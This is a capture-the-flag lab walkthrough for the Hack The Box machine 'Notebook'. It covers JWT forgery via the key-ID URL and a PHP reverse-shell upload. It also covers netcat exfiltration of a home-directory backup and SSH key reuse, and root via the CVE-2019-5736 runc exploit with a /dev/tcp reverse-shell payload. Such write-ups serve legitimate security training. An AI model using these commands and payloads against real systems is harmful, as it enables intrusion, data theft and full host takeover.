# Hack The Box Guide by Alen Peric:
## The Notebook
### IP: 10.10.10.230

### Summary: 

The Notebook introduces us to jwt token manipulation. Lots of interesting lessons on base64 encoding/decoding, constructing cookies and manipulating them. Great insight into transferring files using netcat. This machine also shows us how to manipulate the docker exec environment for privilege escalation. Touches on “go” and “tar” files, as well as ssh private keys for verification.

### CVE References:
- CVE-2019-5736 

**-------------------------------------------------------------------------------------------------------------------------------**

### Important Commands:
*ssh-keygen -t rsa -b 4096 -m PEM -f privKey.key
openssl rsa -in privKey.key -pubout -outform PEM -out privKey.key.pub
nc -N 10.10.16.160 1717 < /var/backups/home.tar.gz
nc -nvlp 1717 > home.tar.gz
ssh -i id_rsa noah@10.10.10.230 
Sudo -l
sudo /usr/bin/docker exec -it webapp-dev01 bash
go build main.go*

**-------------------------------------------------------------------------------------------------------------------------------**

### Notes:

Starting with enumeration, we observe that port 22 (SSH) and port 80 (HTTP) are open. There was also port 10010 open with rxapi, however that is a rabbid hole. Start your burpsuite, turn packet intercepts off and let’s head to the website. There is a small webapp running on there, where we are able to create an account and post notes to a website. After some experimenting trying to inject SQL and reverse shells to the website, we observe that there is a token that gets passed through the packet whenever we refresh the page. The cookie token looks like this:

Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Im1lMTIzIiwiZW1haWwiOiJtZUBtZS5jb20iLCJhZG1pbl9jYXAiOjB9.mtjs7cClGwfZSGFPP8gvpTXuFHCV7UOOxcvc7fvooUKkuOheg1RuiUqWo0Ba7CcC5fBozAU6Vt5jyJ0r1Qmtg1_j8VowZfbqJmwilf89TzDM977yb8WUuqp6fm_rHv0RzJPCQ0V0u_AqOKBr1UOvQsvnwgNO9VcLhpOtRuKovrcf2vY3cwbaK6zNzAT4n9RubQSW2rsmchX3t7FoHzP5Y8HmAbDBZifOEXMymu2Uwjl71S_IHcvGfzweBwa0iYBEsBC4vaDgXh7_RUVx5qn6AjWhrlCRzc24aD-gz-Omy8uVIfVxtRQJ3vyzud1pGkQjJO2bI94c_JjnjFH7WQoXHKjA4PE5bUz-BErCXl2uTPQKrzllKnPzUODfEUNgAQ_HnncBbB48QN69ja63_t3xbaH9Xvo-fiqGBaS68sAdxwFQDLdQ9fN_mcIyu1V9ibiKfZXKbiQmlB-TElmb1BX1bKgu7uLBrWGTV4cM5ucU1fGr0wX6UUazg1mQx5MGEUiCEW9qGL4ihPdUUzZwvP9PgDPGBFJeuwGWeEcnQpahBVEG04Jkmag8hoIMJUTFi35ZpLlcop4NzjSb_btrC0BGT9L6sh5xEeTZcb26g7RdCa5vhVQ_ARhZaUq8C4DIQNWg0uoIEmhSV8ed9JeikAloyUUrKqs44WUPwjDya_ob-2g; uuid=6662433b-f57b-43af-b026-04b151ed1a3c

This is a JWS token. It is encoded in base64. These tokens consist of a header, payload and signature. For this exercise, we will use the websites http://jwt.io and http://base64encode.com / http://base64decode.com/ . We can put the string into http://jwt.io and it shows us some of the fields that are in here. 



You will notice a few things. The red part of the text is the Header, the purple is the Payload and the blue is the signature. The mechanic that occurs here is once the website receives the packet from our host, it will check its localhost on port 7070 in order to make sure the signature of the cookie matches its private key. What we want to do here is modify the packet so that the machine will check our port to verify the signature with our private key. Changing anything on the Header and Payload on jwt.io will not update properly and as such we need to translate our token through the base64 website. We copy the red part of the text, decode it through base64, and change the localhost to our host IP. we re-encode the payload back to base64, add it to a notepad document and append a . to it, which is the separator in the token. We repeat the same for the payload, however, all we changed with the payload was the admin_cap bit from 0 to 1 which is going to make the user you created an admin for this cookie request. Modifying the bit only stays as long as we can generate our own cookie. 

Now it’s time to create a directory mkdir notebook && cd notebook then we generate a new set of ssh keys in this folder with the command: ssh-keygen -t rsa -b 4096 -m PEM -f privKey.key this will generate new RSA keys for us. After this we are going to modify the format by issuing: openssl rsa -in privKey.key -pubout -outform PEM -out privKey.key.pub and then issue the cat command to view both files. We copy the entire key, including the ----BEGINNING OF RSA KEY---- and add both parts to our token in jwt.io website. This should show us that the signature is valid and the entire cookie is constructed. Before we are able to validate the cookie, we have to start hosting our privKey.key on port 7070. In order to accomplish this we start a mini python server on our port 7070, with the command python3 -m http.server 7070. Once this is accomplished, we refresh the notebook page, intercept the packet with burpsuite and replace the cookie token with the one we generated. If everything is done properly, once the website reloads, we should be able to access the admin panel. Remember that each page request will require you to replace the cookie token, in order to maintain admin access to the page. 

We can head to the admin panel now and we notice that we are able to upload files now. I uploaded a simple php reverse shell from Kali’s resources under /usr/share/webshells/php/php-reverse-shell.php or you could use the one from pentest monkey found here: http://pentestmonkey.net/tools/web-shells/php-reverse-shell and set up a netcat listener. Make sure to modify the php shell with your IP and port. Once the shell is uploaded we copy the name generated blablabla.php and append that name to the http://10.10.10.230/blablabla.php and that will trigger the reverse shell to call back to our netcat session. 

Now that we have a connection up and running, we issue the command whoami and it shows us we landed a shell as www-data. Browsing around the directory, we can find a copy of a home directory in /var/backups, as well as a home.tar.gz. While the home directory doesn’t give us all of the read permissions we need, we are able to read home.tar.gz just fine. We issue the command: nc -N 10.10.16.160 1717 < /var/backups/home.tar.gz on the target machine and nc -nvlp 1717 > home.tar.gz on our host machine. This will transfer a copy of home.tar.gz which we can unpack to find a copy of noah’s home directory with the command: tar . In noah’s home is a .ssh folder with a copy of Noah’s private and public key. We can use the private key to authenticate trough ssh, without providing a password. In order to do this, we issue the command ssh -i id_rsa noah@10.10.10.230 

Now that we have access to Noah’s account,  we can cd into his home directory where we find the user flag. Time to escalate our privileges to root! The first thing we do, whenever we test privilege escalation, is to see if the sudo has allowed us to issue any commands as them, without requiring a password. We are able to run the command /usr/bin/docker exec -it webapp-dev01* 

We search for an exploit on google: docker exec exploit github and one of the first results that comes up is a CVE-2019-5736 PoC page: https://github.com/Frichetten/CVE-2019-5736-PoC 
We clone the repository, and modify the main.go file. We will modify the payload, where it says var payload = “blabla”, we will replace it with the following command: var payload = “#!/bin/bash \n echo 'bash -i >& /dev/tcp/10.10.16.160/1337 0>&1'
> /tmp/rev.sh && chmod +x /tmp/rev.sh && bash /tmp/rev.sh"
After this is done, we save the file and build our main by issuing the command go build main.go
This should result in producing a compiled file called just main. Start a mini http server on port 1010 so we are able to upload the main to the target machine as this will be the payload that will be executed to get us to root. We go back to the target machine and issue our sudo command to get into the docker container: sudo /usr/bin/docker exec -it webapp-dev01 bash. Now that we are in the docker container, running as sudo, we open a second instance of noah’s ssh shell and start a netcat listener on port 1337 on our local machine. On the docker instance, we cd into /tmp and then issue a wget http://10.10.16.160:1010/main to download the main we just built with go. Once it is downloaded, we issue the chmod +x ./main command in order to add executable permissions to it. Before we run it, make sure to have the same sudo /usr/bin/docker exec -it webapp-dev01 bash ready in the second terminal, as you’ll have to be quick. Run the ./main in the first docker instance and while it is initializing, issue the command in the second ssh shell and you should hey the response: no help topic for ‘/bin/sh’ if you see this, you’re on the right track and once the command finishes compiling, it should start a shell to root account in the netcat session that is listening on port 1337 should connect via the payload and grant us root permissions. Now we can cd into /root and retrieve our root flag! Good job on finishing this lab!




**-------------------------------------------------------------------------------------------------------------------------------**

### Lessons:

Amazing learns about JWT token manipulation. Aside from being able to redirect the verification process to our local machine and sign with our own private key. The alternative is the ability to change the JWT token’s alg field to none, which omits the need for a signature in the cookie. Lots of great information in here: https://cyberpolygon.com/materials/security-of-json-web-tokens-jwt/ as well as the actual website for decrypting JWT tokens can be found here: https://jwt.io/ 
Additionally, here is a great website to convert base64 and encode it: https://www.base64encode.org/ also there seems to be a brute-forcing tool for jwt tokens on github here: https://github.com/ticarpi/jwt_tool/ 
Getting the root flag is as usual with first issuing the sudo -l command and using a docker exec exploit against it: https://github.com/Frichetten/CVE-2019-5736-PoC The exploit may be found here and all we need to do is manipulate the payload variable in order for it to execute our commands. Also another good look into transferring files using netcat. 
